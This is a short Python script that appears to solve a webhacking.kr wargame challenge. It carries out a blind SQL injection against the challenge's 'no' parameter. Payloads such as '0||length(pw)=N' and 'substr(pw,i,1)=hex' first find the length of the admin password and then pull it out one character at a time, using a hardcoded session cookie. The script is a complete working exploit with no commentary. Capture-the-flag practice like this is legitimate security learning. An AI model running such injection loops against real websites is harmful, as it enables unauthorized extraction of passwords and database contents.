import requests
import string

url = "https://webhacking.kr/challenge/web-29/"
cookie = {'PHPSESSID': 'csltdbnt02klcvgctq640tijhv'}

str1=string.printable
str1=str1[:-38]

def pw_len():
    for pw_length in range(50):
        param = {"no":"0||length(pw)={}".format(pw_length),"id":"guest","pw":"guest"}
        req = requests.get(url, params=param, cookies=cookie)

        if "admin password :" in req.text:
            print("length:", pw_length)
            return pw_length

def pw_find():
    length = int(pw_len())
    password = ""
    for i in range(length):
        for value in str1:
            param = {"no":"-1||no=2&&substr(pw,{},1)={}".format(i+1, hex(ord(value))),"id":"guest","pw":"guest"}
            print(param)
            req = requests.get(url, params=param, cookies=cookie)
            if "admin password :" in req.text:
                password += str(value)
                print(str(value))
                break
    print("Password:", password)

pw_find()